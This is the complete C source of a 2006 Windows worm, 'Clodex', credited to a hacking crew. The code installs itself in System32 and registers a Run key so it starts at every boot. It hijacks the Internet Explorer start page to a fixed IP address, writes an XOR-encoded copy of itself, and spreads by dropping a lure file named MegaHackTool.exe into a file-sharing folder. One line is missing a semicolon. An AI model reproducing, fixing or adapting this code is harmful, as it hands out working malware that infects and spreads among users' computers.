   //Clodex aká zibrid worm by bd0rk
   //(c)2006 by SOH-Crew
   //www.soh-crew.it.tt & www.hackschool.dl.am

   /* Greetings: TheJT, RaSsGoR, MereX & hampsphire */

   #include <windows.h>
   #include <string.h>
   #include <stdio.h>
   unsigned char reg[30] = "217.172.44.66"

   char windir[MAX_PATH];

   int APIENTRY WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
   {
    int count;
    FILE *in, *out;
    char pathname[256];
    GetWindowsDirectory(windir, sizeof(windir));
    HMODULE hMe = GetModuleHandle(NULL);
    DWORD nRet = GetModuleFileName(hMe, pathname, 256);
    HKEY hKey;
    strcat(windir, "\\System32\\zibrid.exe");
    CopyFile(pathname, windir, 0);

    RegCreateKey (HKEY_CURRENT_USER, "Software\\bd0rk", &hKey);
    RegSetValueEx (hKey, "Clodex", 0, REG_SZ, (LPBYTE) windir, sizeof(windir));

    RegCreateKey (HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer\\Main",&hKey);
    RegSetValueEx (hKey,"Start Page", 0, REG_SZ, reg, sizeof(reg));
    RegCloseKey(hKey);

    RegCreateKey (HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
    RegSetValueEx (hKey, "Clodex", 0, REG_SZ, (LPBYTE)windir, sizeof(windir));

    in = fopen(windir, "rb");
    out = fopen("Clodexbak","wb");
    while (( count = getc(in)) !=EOF)
    {
        count = count ^ 5;
        putc (count, out);
    }
    CopyFile(pathname, "C:\\My Shared Folder\\MegaHackTool.exe", 0);
    return 0;
   }
